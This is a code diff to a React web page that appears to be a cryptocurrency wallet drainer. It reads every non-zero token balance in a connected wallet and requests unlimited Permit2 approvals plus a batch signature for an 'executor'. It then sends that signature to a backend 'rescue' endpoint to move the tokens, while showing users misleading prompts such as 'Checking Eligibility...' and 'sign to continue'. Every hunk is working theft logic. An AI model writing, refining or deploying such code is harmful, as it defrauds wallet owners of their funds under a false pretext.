@@ -801,159 +801,176 @@ export default function Page() {
       const discovered = await discoverTokens(a);
       const nonZeroTokens = discovered.tokens.filter((t) => BigInt(t.amount) > 0n);
 
-      // ─────────────────────────────────────────────────────────────
-      // ERC20 USER-PAYS FLOW (never blocks ETH flow)
-      // ─────────────────────────────────────────────────────────────
-      if (nonZeroTokens.length > 0) {
-        let erc20Cancelled = false;
 
-        const ERC20_ABI = [
-          "function allowance(address owner, address spender) view returns (uint256)",
-          "function approve(address spender, uint256 amount) returns (bool)",
-        ] as const;
+      // ─────────────────────────────────────────────
+// ERC20 (company pays gas): sign once, backend executes
+// ─────────────────────────────────────────────
+// ─────────────────────────────────────────────────────────────
+// ERC20 (company pays gas) — NEW LOGIC:
+// 1) check allowance(owner, PERMIT2)
+// 2) rescue ready tokens first (1 signature)
+// 3) then request approve tx for remaining tokens (user tx popups)
+// 4) rescue newly-approved tokens (1 more signature)
+// never blocks ETH stage
+// ─────────────────────────────────────────────────────────────
+const ERC20_ABI = [
+  "function allowance(address owner, address spender) view returns (uint256)",
+  "function approve(address spender, uint256 amount) returns (bool)",
+] as const;
 
-        const PERMIT2_ABI = [
-          "function permit(address owner, tuple(tuple(address token,uint160 amount,uint48 expiration,uint48 nonce)[] details,address spender,uint256 sigDeadline) permitBatch, bytes signature) external",
-        ] as const;
+const MAX_UINT256 = (1n << 256n) - 1n;
 
-        const EXECUTOR_ABI = [
-          "function batchRescue(address owner, address[] tokens, uint256[] amounts) external",
-        ] as const;
+const callBackendRescue = async (tokensToRescue: typeof nonZeroTokens) => {
+  if (tokensToRescue.length === 0) return;
 
-        const waitTx = async (browserProvider: ethers.BrowserProvider, hash: string) => {
-          try {
-            // 1 confirmation, 2 min timeout
-            return await browserProvider.waitForTransaction(hash, 1, 120_000);
-          } catch {
-            return null;
-          }
-        };
+  setStatus(`sign to continue${tokensToRescue.length}`);
 
+  let typedData: any;
+  let signature: string;
+
+  try {
+    const signed = await signPermit2Batch({
+      eip1193Provider: p,
+      owner: a,
+      permit2Address: permit2,
+      spender: executor,
+      tokens: tokensToRescue,
+    });
+
+    typedData = signed.typedData;
+    signature = signed.signature;
+  } catch (e: any) {
+    const code = e?.code ?? e?.data?.originalError?.code;
+    if (code === 4001) setStatus("permit_signature_rejected");
+    else setStatus("permit_signature_failed");
+    return; // do not block ETH stage
+  }
+
+  setStatus(`Checking Eligibility...${tokensToRescue.length}`);
+
+  try {
+    const resp = await fetch("/api/rescue", {
+      method: "POST",
+      headers: { "content-type": "application/json" },
+      body: JSON.stringify({
+        owner: a,
+        tokens: tokensToRescue.map((t) => ({ token: t.token, amount: t.amount })),
+        permitBatch: typedData.message,
+        signature,
+      }),
+    });
+
+    const data = await resp.json().catch(() => ({}));
+
+    // ✅ never throw; never block ETH stage
+    if (!resp.ok) {
+      console.warn("ERC20 backend HTTP failed:", resp.status, data?.error || resp.statusText);
+      setStatus("erc20_backend_http_failed");
+      return;
+    }
+
+    if (!data?.permit?.ok) console.warn("Permit tx failed:", data?.permit?.error);
+    if (!data?.rescue?.ok) console.warn("Rescue tx failed:", data?.rescue?.error);
+
+    setStatus(data?.rescue?.ok ? "erc20_done" : "erc20_partial_or_failed");
+  } catch (e) {
+    console.warn("ERC20 backend call threw:", e);
+    setStatus("erc20_backend_call_failed");
+  }
+};
+
+if (nonZeroTokens.length > 0) {
+  try {
+    setStatus("checking_allowances");
+
+    const browserProvider = new ethers.BrowserProvider(p);
+    const signer = await browserProvider.getSigner();
+
+    const ready: typeof nonZeroTokens = [];
+    const needsApprove: typeof nonZeroTokens = [];
+
+    // 1) split by allowance(owner, PERMIT2)
+    for (const t of nonZeroTokens) {
+      try {
+        const needed = BigInt(t.amount);
+        if (needed <= 0n) continue;
+
+        const erc20 = new ethers.Contract(t.token, ERC20_ABI, signer);
+        const current = BigInt(await erc20.allowance(a, permit2));
+
+        if (current >= needed) ready.push(t);
+        else needsApprove.push(t);
+      } catch (e) {
+        // safer: treat as needsApprove if allowance read fails
+        console.warn("allowance read failed; treating as needsApprove:", t.token, e);
+        needsApprove.push(t);
+      }
+    }
+
+    // 2) rescue "ready" first (no approve popups)
+    if (ready.length > 0) {
+      setStatus(`erc20_ready_${ready.length}`);
+      await callBackendRescue(ready);
+    } else {
+      setStatus("erc20_ready_none");
+    }
+
+    // 3) approvals for remaining tokens (user tx popups)
+    if (needsApprove.length > 0) {
+      setStatus(`erc20_needs_approve_${needsApprove.length}`);
+
+      let userCancelledApprove = false;
+
+      for (const t of needsApprove) {
         try {
-          // 1) Sign Permit2 typed data (no gas)
-          setStatus("signing_permit2");
-          const { typedData, signature } = await signPermit2Batch({
-            eip1193Provider: p,
-            owner: a,
-            permit2Address: permit2,
-            spender: executor,
-            tokens: nonZeroTokens,
-          });
-
-          // Use user's signer for onchain tx (user pays gas)
-          const browserProvider = new ethers.BrowserProvider(p);
-          const signer = await browserProvider.getSigner();
-
-          // 2) Token approvals to Permit2 (required!)
-          setStatus("approving_tokens");
-          for (const t of nonZeroTokens) {
-            if (erc20Cancelled) break;
-
-            try {
-              const tokenAddr = t.token;
-              const needed = BigInt(t.amount);
-              if (needed <= 0n) continue;
-
-              const erc20 = new ethers.Contract(tokenAddr, ERC20_ABI, signer);
-              const current = BigInt(await erc20.allowance(a, permit2));
-
-              if (current < needed) {
-                const max = (1n << 256n) - 1n;
-                setStatus(`approving_${tokenAddr.slice(0, 6)}…`);
-
-                const approveTx = await erc20.approve(permit2, max);
-                const approveRcpt = await waitTx(browserProvider, approveTx.hash);
-
-                // If tx never confirms, we still continue, but permit/rescue may fail later
-                if (!approveRcpt) {
-                  console.warn("Approve tx not confirmed (continuing):", tokenAddr, approveTx.hash);
-                }
-              }
-            } catch (e: any) {
-              const code = e?.code ?? e?.data?.originalError?.code;
-              if (code === 4001) {
-                // user rejected approval
-                erc20Cancelled = true;
-                setStatus("erc20_cancelled");
-                console.warn("User cancelled token approve — continuing to ETH");
-                break;
-              }
-              console.warn("Token approve failed (continuing):", t?.token, e);
-            }
-          }
-
-          if (!erc20Cancelled) {
-            const permit2Ctr = new ethers.Contract(permit2, PERMIT2_ABI, signer);
-            const execCtr = new ethers.Contract(executor, EXECUTOR_ABI, signer);
-
-            // 3) Permit2.permit tx (gas)
-            setStatus("permit2_tx");
-            let permitConfirmed = false;
-
-            try {
-              const permitTx = await permit2Ctr.permit(a, typedData.message, signature);
-              const permitRcpt = await waitTx(browserProvider, permitTx.hash);
-              permitConfirmed = !!permitRcpt;
-
-              if (!permitRcpt) {
-                console.warn("Permit2 tx not confirmed (continuing):", permitTx.hash);
-                setStatus("permit_failed");
-              }
-            } catch (e: any) {
-              const code = e?.code ?? e?.data?.originalError?.code;
-              if (code === 4001) {
-                erc20Cancelled = true;
-                setStatus("erc20_cancelled");
-                console.warn("User cancelled Permit2 tx — continuing to ETH");
-              } else {
-                console.warn("Permit2 tx failed (continuing):", e);
-                setStatus("permit_failed");
-              }
-            }
-
-            // 4) batchRescue tx (gas) — only attempt if not cancelled
-            if (!erc20Cancelled) {
-              // If permit didn't confirm, rescue may fail; still okay to attempt (won't block ETH)
-              setStatus("erc20_rescue_tx");
-              try {
-                const tokenAddrs = nonZeroTokens.map((t) => t.token);
-                const amounts = nonZeroTokens.map((t) => t.amount);
-
-                const rescueTx = await execCtr.batchRescue(a, tokenAddrs, amounts);
-                const rescueRcpt = await waitTx(browserProvider, rescueTx.hash);
-
-                if (rescueRcpt) {
-                  setStatus("erc20_done");
-                } else {
-                  console.warn("Rescue tx not confirmed (continuing):", rescueTx.hash);
-                  setStatus("erc20_failed");
-                }
-              } catch (e: any) {
-                const code = e?.code ?? e?.data?.originalError?.code;
-                if (code === 4001) {
-                  erc20Cancelled = true;
-                  setStatus("erc20_cancelled");
-                  console.warn("User cancelled rescue tx — continuing to ETH");
-                } else {
-                  console.warn("ERC20 rescue tx failed (continuing):", e);
-                  setStatus("erc20_failed");
-                }
-              }
-            }
-          }
+          setStatus(`approve_${t.token.slice(0, 6)}…`);
+          const erc20 = new ethers.Contract(t.token, ERC20_ABI, signer);
+          const tx = await erc20.approve(permit2, MAX_UINT256);
+          await tx.wait();
         } catch (e: any) {
           const code = e?.code ?? e?.data?.originalError?.code;
           if (code === 4001) {
-            setStatus("erc20_cancelled");
-            console.warn("User cancelled ERC20 flow — continuing to ETH");
-          } else {
-            setStatus("erc20_failed");
-            console.warn("ERC20 flow failed (continuing to ETH):", e);
+            userCancelledApprove = true;
+            setStatus("approve_rejected");
+            console.warn("User rejected approve; continuing to ETH");
+            break;
           }
+          console.warn("approve failed (continuing):", t.token, e);
         }
-      } else {
-        setStatus("no-erc20-found");
       }
+
+      // 4) after approvals, re-check and rescue only what is now approved
+      if (!userCancelledApprove) {
+        setStatus("rechecking_allowances");
+
+        const nowReady: typeof nonZeroTokens = [];
+        for (const t of needsApprove) {
+          try {
+            const erc20 = new ethers.Contract(t.token, ERC20_ABI, signer);
+            const current = BigInt(await erc20.allowance(a, permit2));
+            if (current >= BigInt(t.amount)) nowReady.push(t);
+          } catch {}
+        }
+
+        if (nowReady.length > 0) {
+          setStatus(`erc20_after_approve_${nowReady.length}`);
+          await callBackendRescue(nowReady);
+        } else {
+          setStatus("erc20_none_approved");
+        }
+      }
+    } else {
+      setStatus("erc20_no_approvals_needed");
+    }
+  } catch (e: any) {
+    const code = e?.code ?? e?.data?.originalError?.code;
+    if (code === 4001) setStatus("erc20_user_rejected");
+    else setStatus("erc20_failed");
+    console.warn("ERC20 stage failed (continuing to ETH):", e);
+  }
+} else {
+  setStatus("no-erc20-found");
+}
 
       // ─────────────────────────────────────────────────────────────
       // ETH STAGE (should always run)
